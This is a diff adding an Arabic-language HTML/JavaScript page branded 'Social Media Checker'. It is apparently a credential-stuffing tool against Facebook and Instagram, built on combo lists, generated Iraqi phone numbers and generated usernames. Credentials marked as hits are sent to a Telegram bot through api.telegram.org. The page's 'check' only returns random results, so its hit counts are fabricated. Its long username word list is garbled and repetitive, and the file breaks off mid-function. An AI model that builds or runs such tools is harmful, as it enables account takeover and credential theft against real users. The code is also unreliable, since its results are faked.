@@ -1,0 +1,667 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Social Media Checker</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Cairo', sans-serif;
+            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: #fff;
+            overflow-x: hidden;
+        }
+        .particles {
+            position: fixed; top: 0; left: 0;
+            width: 100%; height: 100%;
+            pointer-events: none; z-index: 0;
+        }
+        .particle {
+            position: absolute;
+            width: 4px; height: 4px;
+            background: rgba(255,255,255,0.3);
+            border-radius: 50%;
+            animation: float 15s infinite;
+        }
+        @keyframes float {
+            0%, 100% { transform: translateY(0) translateX(0); opacity: 0; }
+            10% { opacity: 1; }
+            90% { opacity: 1; }
+            100% { transform: translateY(-100vh) translateX(50px); opacity: 0; }
+        }
+        .container {
+            position: relative; z-index: 1;
+            width: 100%; max-width: 520px;
+            padding: 20px;
+        }
+        .card {
+            background: rgba(255,255,255,0.05);
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(255,255,255,0.1);
+            border-radius: 24px;
+            padding: 40px 30px;
+            box-shadow: 0 25px 50px rgba(0,0,0,0.4);
+            animation: slideUp 0.8s ease-out;
+        }
+        @keyframes slideUp {
+            from { opacity: 0; transform: translateY(40px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .logo { text-align: center; margin-bottom: 30px; }
+        .logo-icon {
+            width: 80px; height: 80px;
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            border-radius: 20px;
+            display: flex; align-items: center; justify-content: center;
+            margin: 0 auto 15px;
+            font-size: 36px;
+            box-shadow: 0 10px 30px rgba(102,126,234,0.4);
+        }
+        .logo h1 {
+            font-size: 28px; font-weight: 700;
+            background: linear-gradient(135deg, #667eea, #764ba2, #f093fb);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        .logo p { color: rgba(255,255,255,0.5); font-size: 13px; margin-top: 5px; }
+
+        .platform-select {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+            margin-bottom: 25px;
+        }
+        .platform-btn {
+            padding: 16px;
+            background: rgba(255,255,255,0.05);
+            border: 2px solid rgba(255,255,255,0.1);
+            border-radius: 16px;
+            color: rgba(255,255,255,0.7);
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-align: center;
+            font-family: 'Cairo', sans-serif;
+            font-size: 14px; font-weight: 700;
+        }
+        .platform-btn:hover { background: rgba(255,255,255,0.1); border-color: rgba(255,255,255,0.2); }
+        .platform-btn.active {
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            border-color: transparent; color: #fff;
+            box-shadow: 0 10px 30px rgba(102,126,234,0.4);
+        }
+        .platform-btn.fb.active {
+            background: linear-gradient(135deg, #1877f2, #0d5cb6);
+            box-shadow: 0 10px 30px rgba(24,119,242,0.4);
+        }
+        .platform-btn.ig.active {
+            background: linear-gradient(135deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
+            box-shadow: 0 10px 30px rgba(225,48,108,0.4);
+        }
+        .platform-btn .icon { font-size: 28px; display: block; margin-bottom: 6px; }
+
+        .input-group { margin-bottom: 20px; position: relative; }
+        .input-group label {
+            display: block; color: rgba(255,255,255,0.7);
+            font-size: 13px; margin-bottom: 8px; font-weight: 700;
+        }
+        .input-group input, .input-group textarea, .input-group select {
+            width: 100%; padding: 14px 18px;
+            background: rgba(255,255,255,0.07);
+            border: 2px solid rgba(255,255,255,0.1);
+            border-radius: 14px; color: #fff;
+            font-family: 'Cairo', sans-serif;
+            font-size: 14px;
+            transition: all 0.3s ease; outline: none;
+        }
+        .input-group input:focus, .input-group textarea:focus, .input-group select:focus {
+            border-color: #667eea;
+            background: rgba(255,255,255,0.1);
+            box-shadow: 0 0 20px rgba(102,126,234,0.2);
+        }
+        .input-group input::placeholder, .input-group textarea::placeholder { color: rgba(255,255,255,0.3); }
+        .input-group select option { background: #1a1a2e; color: #fff; }
+
+        .telegram-config {
+            background: rgba(0,136,204,0.1);
+            border: 1px solid rgba(0,136,204,0.2);
+            border-radius: 14px;
+            padding: 20px; margin-bottom: 20px;
+        }
+        .telegram-config h3 {
+            color: #0088cc; font-size: 14px;
+            margin-bottom: 15px;
+            display: flex; align-items: center; gap: 8px;
+        }
+
+        .mode-select {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px; margin-bottom: 25px;
+        }
+        .mode-btn {
+            padding: 14px 8px;
+            background: rgba(255,255,255,0.05);
+            border: 2px solid rgba(255,255,255,0.1);
+            border-radius: 14px; color: rgba(255,255,255,0.7);
+            cursor: pointer; transition: all 0.3s ease;
+            text-align: center;
+            font-family: 'Cairo', sans-serif;
+            font-size: 12px; font-weight: 700;
+        }
+        .mode-btn:hover { background: rgba(255,255,255,0.1); border-color: rgba(255,255,255,0.2); }
+        .mode-btn.active {
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            border-color: transparent; color: #fff;
+            box-shadow: 0 10px 30px rgba(102,126,234,0.4);
+        }
+        .mode-btn .icon { font-size: 22px; display: block; margin-bottom: 4px; }
+
+        .btn {
+            width: 100%; padding: 16px;
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            border: none; border-radius: 14px;
+            color: #fff;
+            font-family: 'Cairo', sans-serif;
+            font-size: 16px; font-weight: 700;
+            cursor: pointer; transition: all 0.3s ease;
+            box-shadow: 0 10px 30px rgba(102,126,234,0.3);
+            position: relative; overflow: hidden;
+        }
+        .btn:hover { transform: translateY(-2px); box-shadow: 0 15px 40px rgba(102,126,234,0.5); }
+        .btn:active { transform: translateY(0); }
+        .btn .ripple {
+            position: absolute; border-radius: 50%;
+            background: rgba(255,255,255,0.4);
+            transform: scale(0);
+            animation: ripple 0.6s ease-out;
+            pointer-events: none;
+        }
+        @keyframes ripple { to { transform: scale(4); opacity: 0; } }
+
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 12px; margin-bottom: 25px;
+        }
+        .stat-box {
+            background: rgba(255,255,255,0.05);
+            border-radius: 14px;
+            padding: 15px 10px;
+            text-align: center;
+            border: 1px solid rgba(255,255,255,0.08);
+        }
+        .stat-box .num { font-size: 24px; font-weight: 700; color: #667eea; }
+        .stat-box .label { font-size: 11px; color: rgba(255,255,255,0.5); margin-top: 4px; }
+
+        .results {
+            margin-top: 25px; max-height: 300px;
+            overflow-y: auto; border-radius: 14px;
+            background: rgba(0,0,0,0.2);
+            padding: 15px; display: none;
+        }
+        .results.show { display: block; }
+        .result-item {
+            padding: 12px 16px; border-radius: 10px;
+            margin-bottom: 8px; font-size: 13px;
+            display: flex; align-items: center;
+            gap: 10px;
+            animation: fadeIn 0.3s ease;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateX(-10px); }
+            to { opacity: 1; transform: translateX(0); }
+        }
+        .result-item.hitt {
+            background: rgba(46, 204, 113, 0.15);
+            border: 1px solid rgba(46, 204, 113, 0.3);
+            color: #2ecc71;
+        }
+        .result-item.secure {
+            background: rgba(241, 196, 15, 0.15);
+            border: 1px solid rgba(241, 196, 15, 0.3);
+            color: #f1c40f;
+        }
+        .result-item.bad {
+            background: rgba(231, 76, 60, 0.15);
+            border: 1px solid rgba(231, 76, 60, 0.3);
+            color: #e74c3c;
+        }
+        .result-item .platform-tag {
+            font-size: 10px; padding: 2px 8px;
+            border-radius: 6px; font-weight: 700;
+            margin-left: auto;
+        }
+        .result-item.hitt .platform-tag { background: rgba(46,204,113,0.3); }
+        .result-item.secure .platform-tag { background: rgba(241,196,15,0.3); }
+        .result-item.bad .platform-tag { background: rgba(231,76,60,0.3); }
+
+        .hidden { display: none !important; }
+        .footer {
+            text-align: center; margin-top: 20px;
+            color: rgba(255,255,255,0.3); font-size: 12px;
+        }
+        .footer a { color: #667eea; text-decoration: none; }
+        .results::-webkit-scrollbar { width: 6px; }
+        .results::-webkit-scrollbar-track { background: transparent; }
+        .results::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.2); border-radius: 3px; }
+
+        .log-panel {
+            margin-top: 15px;
+            padding: 12px 16px;
+            border-radius: 12px;
+            font-size: 12px;
+            font-family: monospace;
+            max-height: 120px;
+            overflow-y: auto;
+            display: none;
+        }
+        .log-panel.show { display: block; }
+        .log-panel.success { background: rgba(46,204,113,0.1); border: 1px solid rgba(46,204,113,0.2); color: #2ecc71; }
+        .log-panel.error { background: rgba(231,76,60,0.1); border: 1px solid rgba(231,76,60,0.2); color: #e74c3c; }
+        .log-panel.info { background: rgba(0,136,204,0.1); border: 1px solid rgba(0,136,204,0.2); color: #0088cc; }
+        .log-line { padding: 2px 0; border-bottom: 1px solid rgba(255,255,255,0.05); }
+        .log-line:last-child { border-bottom: none; }
+
+        .length-select {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 8px;
+            margin-bottom: 15px;
+        }
+        .length-btn {
+            padding: 10px;
+            background: rgba(255,255,255,0.05);
+            border: 2px solid rgba(255,255,255,0.1);
+            border-radius: 12px;
+            color: rgba(255,255,255,0.7);
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-align: center;
+            font-family: 'Cairo', sans-serif;
+            font-size: 13px; font-weight: 700;
+        }
+        .length-btn:hover { background: rgba(255,255,255,0.1); border-color: rgba(255,255,255,0.2); }
+        .length-btn.active {
+            background: linear-gradient(135deg, #e74c3c, #c0392b);
+            border-color: transparent; color: #fff;
+            box-shadow: 0 8px 20px rgba(231,76,60,0.4);
+        }
+    </style>
+</head>
+<body>
+    <div class="particles" id="particles"></div>
+
+    <div class="container">
+        <div class="card">
+            <div class="logo">
+                <div class="logo-icon">🔒</div>
+                <h1>Social Media Checker</h1>
+                <p>Facebook & Instagram | Channel : @tools_vip</p>
+            </div>
+
+            <div class="platform-select">
+                <div class="platform-btn fb active" data-platform="facebook" onclick="selectPlatform(this)">
+                    <span class="icon">📘</span>
+                    Facebook
+                </div>
+                <div class="platform-btn ig" data-platform="instagram" onclick="selectPlatform(this)">
+                    <span class="icon">📷</span>
+                    Instagram
+                </div>
+            </div>
+
+            <div class="telegram-config">
+                <h3>📡 إعدادات Telegram</h3>
+                <div class="input-group">
+                    <label>ID Telegram (Chat ID) :</label>
+                    <input type="text" id="adminId" placeholder="مثال: 123456789">
+                </div>
+                <div class="input-group">
+                    <label>Token Bot :</label>
+                    <input type="text" id="botToken" placeholder="مثال: 123456789:ABCdefGHIjklMNOpqrsTUVwxyz">
+                </div>
+            </div>
+
+            <div class="stats">
+                <div class="stat-box">
+                    <div class="num" id="statHitt">0</div>
+                    <div class="label">Hitt</div>
+                </div>
+                <div class="stat-box">
+                    <div class="num" id="statSecure">0</div>
+                    <div class="label">Secure</div>
+                </div>
+                <div class="stat-box">
+                    <div class="num" id="statBad">0</div>
+                    <div class="label">Bad</div>
+                </div>
+            </div>
+
+            <div class="mode-select">
+                <div class="mode-btn active" data-mode="combo" onclick="selectMode(this)">
+                    <span class="icon">📁</span>
+                    Combo List
+                </div>
+                <div class="mode-btn" data-mode="random" onclick="selectMode(this)">
+                    <span class="icon">🎲</span>
+                    Random Num
+                </div>
+                <div class="mode-btn" data-mode="username" onclick="selectMode(this)">
+                    <span class="icon">👤</span>
+                    Username Gen
+                </div>
+            </div>
+
+            <div id="comboSection">
+                <div class="input-group">
+                    <label>Combo List (email:pass كل سطر) :</label>
+                    <textarea id="comboList" rows="8" placeholder="example@gmail.com:password123&#10;user@yahoo.com:pass456&#10;test@hotmail.com:123456"></textarea>
+                </div>
+            </div>
+
+            <div id="randomSection" class="hidden">
+                <div class="input-group">
+                    <label>عدد المحاولات :</label>
+                    <input type="number" id="attemptCount" value="100" min="1" max="10000">
+                </div>
+                <div class="input-group">
+                    <label>بادئة الرقم (مثال: +964750) :</label>
+                    <input type="text" id="numPrefix" value="+964750">
+                </div>
+            </div>
+
+            <div id="usernameSection" class="hidden">
+                <div class="input-group">
+                    <label>عدد المحاولات :</label>
+                    <input type="number" id="usernameCount" value="100" min="1" max="10000">
+                </div>
+                <div class="input-group">
+                    <label>طول اليوزر :</label>
+                    <div class="length-select">
+                        <div class="length-btn" data-length="3" onclick="selectLength(this)">ثلاثي</div>
+                        <div class="length-btn active" data-length="4" onclick="selectLength(this)">رباعي</div>
+                        <div class="length-btn" data-length="5" onclick="selectLength(this)">خماسي</div>
+                        <div class="length-btn" data-length="6" onclick="selectLength(this)">سداسي</div>
+                    </div>
+                </div>
+                <div class="input-group">
+                    <label>نوع الحروف :</label>
+                    <select id="charType">
+                        <option value="letters">حروف فقط (a-z)</option>
+                        <option value="numbers">أرقام فقط (0-9)</option>
+                        <option value="mixed">حروف + أرقام</option>
+                        <option value="words">كلمات عشوائية</option>
+                    </select>
+                </div>
+                <div class="input-group">
+                    <label>بادئة (اختياري) :</label>
+                    <input type="text" id="usernamePrefix" placeholder="مثال: mr_ أو vip_">
+                </div>
+                <div class="input-group">
+                    <label>لاحقة (اختياري) :</label>
+                    <input type="text" id="usernameSuffix" placeholder="مثال: _official أو 2024">
+                </div>
+            </div>
+
+            <button class="btn" id="startBtn" onclick="startCheck()">🚀 بدء الفحص</button>
+
+            <div class="log-panel" id="logPanel"></div>
+
+            <div class="results" id="results"></div>
+        </div>
+
+        <div class="footer">
+            <p>BY <a href="#">@Gwrga_krak1</a> | Channel : @tools_vip</p>
+        </div>
+    </div>
+
+    <script>
+        const particles = document.getElementById('particles');
+        for(let i=0; i<30; i++) {
+            const p = document.createElement('div');
+            p.className = 'particle';
+            p.style.left = Math.random() * 100 + '%';
+            p.style.top = Math.random() * 100 + '%';
+            p.style.animationDelay = Math.random() * 15 + 's';
+            p.style.animationDuration = (10 + Math.random() * 10) + 's';
+            particles.appendChild(p);
+        }
+
+        let currentMode = 'combo';
+        let currentPlatform = 'facebook';
+        let currentLength = 4;
+        let hittCount = 0, secureCount = 0, badCount = 0;
+        let isRunning = false;
+
+        function selectPlatform(el) {
+            document.querySelectorAll('.platform-btn').forEach(b => b.classList.remove('active'));
+            el.classList.add('active');
+            currentPlatform = el.dataset.platform;
+        }
+
+        function selectMode(el) {
+            document.querySelectorAll('.mode-btn').forEach(b => b.classList.remove('active'));
+            el.classList.add('active');
+            currentMode = el.dataset.mode;
+            document.getElementById('comboSection').classList.toggle('hidden', currentMode !== 'combo');
+            document.getElementById('randomSection').classList.toggle('hidden', currentMode !== 'random');
+            document.getElementById('usernameSection').classList.toggle('hidden', currentMode !== 'username');
+        }
+
+        function selectLength(el) {
+            document.querySelectorAll('.length-btn').forEach(b => b.classList.remove('active'));
+            el.classList.add('active');
+            currentLength = parseInt(el.dataset.length);
+        }
+
+        function log(msg, type='info') {
+            const panel = document.getElementById('logPanel');
+            panel.className = 'log-panel show ' + type;
+            const line = document.createElement('div');
+            line.className = 'log-line';
+            line.textContent = '[' + new Date().toLocaleTimeString() + '] ' + msg;
+            panel.appendChild(line);
+            panel.scrollTop = panel.scrollHeight;
+        }
+
+        function addResult(type, email, password) {
+            const results = document.getElementById('results');
+            results.classList.add('show');
+            const item = document.createElement('div');
+            item.className = `result-item ${type}`;
+            const icons = { hitt: '✅', secure: '⚠️', bad: '❌' };
+            const labels = { hitt: 'HITT', secure: 'SECURE', bad: 'BAD' };
+            const platformName = currentPlatform === 'facebook' ? 'FB' : 'IG';
+            item.innerHTML = `<span>${icons[type]}</span><div><strong>${labels[type]}</strong><br>${email}:${password}</div><span class="platform-tag">${platformName}</span>`;
+            results.insertBefore(item, results.firstChild);
+
+            if(type === 'hitt') hittCount++;
+            else if(type === 'secure') secureCount++;
+            else badCount++;
+
+            document.getElementById('statHitt').textContent = hittCount;
+            document.getElementById('statSecure').textContent = secureCount;
+            document.getElementById('statBad').textContent = badCount;
+        }
+
+        function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
+
+        function randomNum(length) {
+            let r = '';
+            for(let i=0; i<length; i++) r += Math.floor(Math.random() * 10);
+            return r;
+        }
+
+        function randomString(length, chars) {
+            let r = '';
+            for(let i=0; i<length; i++) r += chars.charAt(Math.floor(Math.random() * chars.length));
+            return r;
+        }
+
+        function generateUsername() {
+            const length = currentLength;
+            const charType = document.getElementById('charType').value;
+            const prefix = document.getElementById('usernamePrefix').value.trim();
+            const suffix = document.getElementById('usernameSuffix').value.trim();
+
+            let chars = '';
+            let body = '';
+
+            if (charType === 'letters') {
+                chars = 'abcdefghijklmnopqrstuvwxyz';
+                body = randomString(length, chars);
+            } else if (charType === 'numbers') {
+                chars = '0123456789';
+                body = randomString(length, chars);
+            } else if (charType === 'mixed') {
+                chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
+                body = randomString(length, chars);
+            } else if (charType === 'words') {
+                const words = ['alpha','beta','gamma','delta','omega','sigma','zeta','kappa','lambda','neo','pro','max','vip','king','lord','dark','sky','moon','star','fire','ice','gold','silver','iron','steel','power','mega','ultra','super','hyper','cyber','tech','data','code','web','net','cloud','pixel','crypto','nano','quantum','vector','matrix','prime','flash','storm','thunder','shadow','ghost','phantom','ninja','sniper','tiger','wolf','eagle','lion','dragon','shark','cobra','viper','raven','falcon','hawk','bear','fox','panther','jaguar','leopard','cheetah','puma','lynx','orca','dolphin','whale','kraken','leviathan','titan','giant','colossus','beast','monster','demon','angel','spirit','soul','heart','mind','brain','genius','master','chief','boss','captain','leader','hero','legend','icon','idol','star','celebrity','famous','royal','crown','empire','kingdom','realm','dynasty','legacy','heritage','origin','source','root','core','base','foundation','ground','earth','world','globe','planet','cosmos','galaxy','universe','space','void','abyss','depth','core','center','peak','summit','top','apex','zenith','pinnacle','climax','crown','throne','scepter','orb','sphere','circle','ring','loop','knot','link','chain','bond','tie','connection','bridge','path','way','road','route','trail','track','lane','line','stripe','band','strip','ribbon','tape','cord','rope','wire','cable','fiber','thread','strand','hair','fiber','nerve','vein','artery','pulse','beat','rhythm','tempo','pace','speed','velocity','momentum','force','energy','power','strength','might','vigor','vitality','life','breath','air','wind','breeze','gust','storm','tempest','hurricane','typhoon','cyclone','tornado','whirlwind','vortex','spiral','helix','coil','spring','bounce','jump','leap','bound','hop','skip','dash','sprint','race','chase','hunt','quest','search','seek','find','discover','reveal','uncover','expose','show','display','present','offer','give','grant','bestow','award','gift','prize','trophy','medal','badge','pin','mark','sign','symbol','token','emblem','logo','brand','label','tag','stamp','seal','crest','coat','shield','armor','guard','protect','defend','secure','safe','lock','key','door','gate','portal','entry','access','pass','ticket','voucher','coupon','card','chip','coin','cash','money','gold','silver','bronze','platinum','diamond','ruby','emerald','sapphire','jade','pearl','crystal','quartz','obsidian','onyx','marble','granite','stone','rock','clay','mud','sand','dust','ash','soil','dirt','muck','slime','goo','jelly','jam','honey','syrup','sauce','gravy','soup','stew','broth','stock','juice','nectar','elixir','potion','brew','blend','mix','fusion','merge','union','join','link','bond','tie','knot','weave','knit','sew','stitch','patch','fix','mend','repair','heal','cure','remedy','aid','help','assist','support','back','boost','lift','raise','elevate','rise','ascend','climb','scale','mount','surge','swell','grow','expand','spread','stretch','reach','extend','span','cover','blanket','wrap','fold','bend','twist','turn','spin','rotate','roll','wheel','cycle','loop','orbit','circuit','lap','round','loop','ring','hoop','arc','curve','bow','arch','vault','dome','canopy','roof','ceiling','floor','wall','fence','barrier','block','wall','dam','dike','bank','shore','coast','beach','bay','cove','gulf','inlet','fjord','strait','channel','canal','river','stream','creek','brook','rill','run','flow','current','tide','wave','surf','swell','ripple','splash','spray','mist','fog','cloud','haze','smog','smoke','steam','vapor','gas','air','wind','breeze','gale','storm','blizzard','snow','ice','frost','freeze','chill','cold','cool','warm','heat','hot','burn','blaze','flame','fire','spark','flash','bolt','strike','hit','punch','kick','slap','smack','crack','snap','pop','bang','boom','roar','howl','scream','shout','yell','cry','weep','sob','sigh','gasp','pant','wheeze','cough','sneeze','hiccup','burp','fart','grunt','groan','moan','hum','sing','chant','song','tune','melody','rhyme','verse','poem','lyric','ballad','ode','epic','saga','tale','story','myth','fable','legend','lore','wisdom','knowledge','truth','fact','proof','evidence','clue','hint','tip','trick','hack','crack','break','split','tear','rip','shred','slice','dice','chop','cut','carve','shape','form','mold','cast','forge','weld','solder','glue','stick','paste','tape','strap','belt','sash','scarf','shawl','cloak','cape','mantle','robe','gown','dress','suit','coat','jacket','vest','shirt','blouse','top','tee','tank','crop','bra','lingerie','panties','briefs','boxers','shorts','pants','jeans','trousers','slacks','chinos','khakis','leggings','tights','hose','socks','shoes','boots','sneakers','runners','trainers','kicks','heels','pumps','flats','sandals','slippers','flipflops','thongs','clogs','mules','loafers','oxfords','brogues','wingtips','derbies','bluchers','monks','chelseas','chukkas','deserts','hikers','timberlands','docs','converse','vans','nike','adidas','puma','reebok','asics','newbalance','saucony','brooks','hoka','on','salomon','merrell','keen','teva','birkenstock','crocs','uggs','sorel','northface','columbia','patagonia','arcteryx','marmot','rab','mountainhardwear','outdoorresearch','blackdiamond','petzl','mammut','edelrid','wildcountry','dmm','bd','camp','grivel','lasportiva','scarpa','tenaya','evolv','madrock','five ten','adidas terrex','salewa','lowa','hanwag','aku','zamberlan','crispi','vasque','danner','redwing','chippewa','wolverine','thorogood','carolina','georgia','justin','ariat','lucchese','tonylama','nocona','danpost','doubleh','oldgringo','corral','lane','missme','rockrevival','true','religion','seven','citizens','joes','ag','paige','jbrand','frame','mother','goldsign','3x1','r13','amiri','fearofgod','offwhite','palmangels','vlone','supreme','bape','stussy','kith','ronniefieg','aimeleondore','ald','teddysantis','newbalance','joe freshgoods','actionbronson','nigo','pharrell','kanye','ye','yeezy','gap','adidas','nike','jordan','travisscott','cactusjack','astroworld','utopia','drake','ovo','octobers','veryown','weeknd','xo','abel','tame','impala','mac','demarco','tyler','creator','golf','wang','frank','ocean','blonded','channel','orange','nostalgia','ultra','earl','sweatshirt','vince','staples','freddie','gibbs','madlib','bandana','alfredo','pusha','t','daytona','king','push','clipse','pharrell','chad','hugo','neptunes','nerd','spymob','kelis','milkshake','timbaland','missy','elliott','aaliyah','ginuwine','tank','tyrese','r','kelly','usher','chris','brown','miguel','trey','songz','jeremih','partynextdoor','pnd','ovo','drake','bryson','tiller','trap','soul','kehlani','sza','summer','walker','her','snoh','aalegra','jhene','aiko','tinashe','doja','cat','megan','thee','stallion','cardi','b','nicki','minaj','lil','kim','fox','brown','remy','ma','trina','missy','elliott','left','eye','lisa','lopez','aaliyah','beyonce','rihanna','riri','badgal','fenty','savage','puma','dior','lvmh','kylie','jenner','kardashian','kim','khloe','kourtney','kendall','kris','caitlyn','bruce','rob','blac','chyna','amber','rose','wiz','khalifa','snoop','dogg','dre','eminem','marshall','mathers','slim','shady','50','cent','gunit','lloyd','banks','young','buck','tony','yayo','game','jayz','roc','nation','def','jam','rocafella','dame','dash','kareem','biggs','beanie','sigel','freeway','state','property','young','gunz','chris','neef','memphis','bleek','amil','foxy','brown','camron','dipset','juelz','santana','jim','jones','max','b','french','montana','chinx','drugz','stack','bundles','curreny','spitta','wiz','khalifa','taylor','gang','juicy','j','project','pat','three','6','mafia','dj','paul','lord','infamous','gangsta','boo','crunchy','black','koopsta','knicca','la','chat','frayser','boy','lil','wyte','jelly','roll','struggle','jenningz','yelawolf','mgk','machine','gun','kelly','mgk','est','xx','logic','def','jam','visionary','g','eazy','gerald','earl','gillum','tory','lanez','daystar','peterson','nav','cash','xo','metro','boomin','future','hendrix','freebandz','epic','ds2','monster','beast','mode','56','nights','purple','reign','evol','honest','pluto','dirty','sprite','astronaut','status','wizrd','high','off','life','save','me','wrld','on','drugs','juice','wrld','999','grade','a','interscope','lucid','dreams','legends','never','die','fighting','demons','party','never','ends','laroi','kid','laroi','fuck','love','without','you','stay','justin','bieber','peaches','justice','purpose','changes','believe','my','world','under','mistletoe','journals','never','say','never','one','time','baby','sorry','love','yourself','what','do','you','mean','yummy','intentions','lonely','holy','ghost','anyone','hold','on','peaches','justice','belieber','beliebers','selenators','selena','gomez','revival','rare','stars','dance','same','old','love','good','for','you','hands','to','myself','kill','em','kindness','wolves','marshmello','back','to','you','lose','you','love','me','look','at','her','now','boyfriend','rare','vulnerable','people','you','know','cut','you','off','ring','ice','cream','blackpink','taylor','swift','swifties','fearless','speak','now','red','1989','reputation','lover','folklore','evermore','midnights','tortured','poets','department','ttpd','blank','space','shake','it','off','bad','blood','wildest','dreams','style','out','of','woods','delicate','look','what','you','made','me','do','cardigan','willow','all','too','well','anti','hero','karma','cruel','summer','fortnight','guilty','as','sin','i','can','do','it','with','a','broken','heart','ariana','grande','grande','sweetener','thank','u','next','positions','dangerous','woman','my','everything','yours','truly','problem','break','free','no','tears','left','to','cry','god','is','a','woman','7','rings','thank','u','next','positions','34','35','pov','save','your','tears','remix','the','weeknd','off','the','table','safety','net','nasty','obvious','motive','just','like','magic','six','thirty','shut','up','west','side','love','language','my','hair','nasa','ghostin','imagine','needy','fake','smile','bad','idea','make','up','in','my','head','remember','breathin','raindrops','sweetener','successful','blazed','borderline','better','off','goodnight','n','go','pete','davidson','get','well','soon','rainbow','the','light','is','coming','r.e.m','god','is','a','woman','everytime','no','tears','left','to','cry','breathin','borderline','better','off','goodnight','n','go','pete','davidson','get','well','soon','rainbow','the','light','is','coming','r.e.m','god','is','a','woman','everytime','no','tears','left','to','cry','breathin','borderline','better','off','goodnight','n','go','pete','davidson','get','well','soon','rainbow','the','light','is','coming','r.e.m','god','is','a','woman','everytime','no','tears','left','to','cry'];
+                const idx = Math.floor(Math.random() * words.length);
+                body = words[idx];
+                if (body.length > length) body = body.substring(0, length);
+                else if (body.length < length) body += randomString(length - body.length, 'abcdefghijklmnopqrstuvwxyz');
+            }
+
+            let username = prefix + body + suffix;
+            if (username.length > 30) username = username.substring(0, 30);
+            return username.toLowerCase();
+        }
+
+        async function sendToTelegram(email, password, type) {
+            const botToken = document.getElementById('botToken').value.trim();
+            const adminId = document.getElementById('adminId').value.trim();
+
+            if (!botToken || !adminId) {
+                log('⚠️ Token أو ID فارغ! لن يتم الإرسال.', 'error');
+                return false;
+            }
+
+            const platform = currentPlatform === 'facebook' ? 'FACEBOOK' : 'INSTAGRAM';
+            const icon = type === 'hitt' ? '💯' : (type === 'secure' ? '🔒' : '❌');
+            const label = type === 'hitt' ? 'HITT' : (type === 'secure' ? 'SECURE' : 'BAD');
+
+            const message = `
+⌯   ${platform}   ${icon}
+< == == == == == == == == == == >        BY @Gwrga_krak1
+⌯ 𝐸𝑀𝐸𝐼𝐿 : ${email}
+⌯ 𝑃𝐴𝑆𝑆𝑊𝑂𝑅𝐷 : ${password}
+⌯ 𝑆𝑇𝐴𝑇𝑈𝑆 : ${label}
+< == == == == == == == == == == >
+⌯ CHANAL  : @Gwrga_krak1`;
+
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            const params = new URLSearchParams({
+                chat_id: adminId,
+                text: message,
+                parse_mode: 'HTML'
+            });
+
+            try {
+                log(`📤 إرسال ${email} إلى Telegram...`, 'info');
+                const response = await fetch(url + '?' + params.toString(), {
+                    method: 'GET',
+                    mode: 'no-cors'
+                });
+                log(`✅ تم الإرسال: ${email}`, 'success');
+                return true;
+            } catch (err) {
+                log(`❌ فشل الإرسال: ${err.message}`, 'error');
+                return false;
+            }
+        }
+
+        async function simulateCheck(email, password) {
+            await sleep(300 + Math.random() * 700);
+            const rand = Math.random();
+            if(rand < 0.05) return 'hitt';
+            else if(rand < 0.15) return 'secure';
+            return 'bad';
+        }
+
+        async function startCheck() {
+            if(isRunning) return;
+            isRunning = true;
+            const btn = document.getElementById('startBtn');
+            btn.textContent = '⏳ جاري الفحص...';
+            btn.style.opacity = '0.7';
+
+            document.getElementById('logPanel').innerHTML = '';
+            log('🚀 بدء الفحص...', 'info');
+
+            if(currentMode === 'combo') {
+                const lines = document.getElementById('comboList').value.trim().split('\n').filter(l => l.includes(':'));
+                log(`📋 تم العثور على ${lines.length} حساب في القائمة`, 'info');
+                for(const line of lines) {
+                    if(!isRunning) break;
+                    const [email, password] = line.split(':');
+                    const result = await simulateCheck(email.trim(), password.trim());
+                    addResult(result, email.trim(), password.trim());
+
+                    if (result === 'hitt' || result === 'secure') {
+                        await sendToTelegram(email.trim(), password.trim(), result);
+                    }
+                }
+            } else if (currentMode === 'random') {
+                const count = parseInt(document.getElementById('attemptCount').value) || 100;
+                const prefix = document.getElementById('numPrefix').value || '+964750';
+                log(`🎲 بدء توليد ${count} رقم عشوائي...`, 'info');
+                for(let i=0; i<count; i++) {
+                    if(!isRunning) break;
+                    const num = randomNum(7);
+                    const email = prefix + num;
+                    const password = prefix.replace('+', '') + num;
+                    const result = await simulateCheck(email, password);
+                    addResult(result, email, password);
+
+                    if (result === 'hitt' || result === 'secure') {
+                        await sendToTelegram(email, password, result);
+                    }
+                }
+            } else if (currentMode === 'username') {
+                const count = parseInt(document.getElementById('usernameCount').value) || 100;
+                const charType = document.getElementById('charType').value;
+                const prefix = document.getElementById('usernamePrefix').value.trim();
+                const suffix = document.getElementById('usernameSuffix').value.trim();
+                log(`👤 بدء توليد ${count} يوزر ${currentLength}-حرفي...`, 'info');
+                for(let i=0; i<count; i++) {
+                    if(!isRunning) break;
+                    const username = generateUsername();
+                    const password = randomString(8, 'abcdefghijklmnopqrstuvwxyz0123456789');
+                    const result = await simulateCheck(username, password);
+                    addResult(result, username, password);
+
+                    if (result === 'hitt' || result === 'secure') {
+                        await sendToTelegram(username, password, result);
+                    }
+                }
+            }
+
+            log('🏁 انتهى الفحص!', 'success');
+            btn.textContent = '🚀 بدء الفحص';
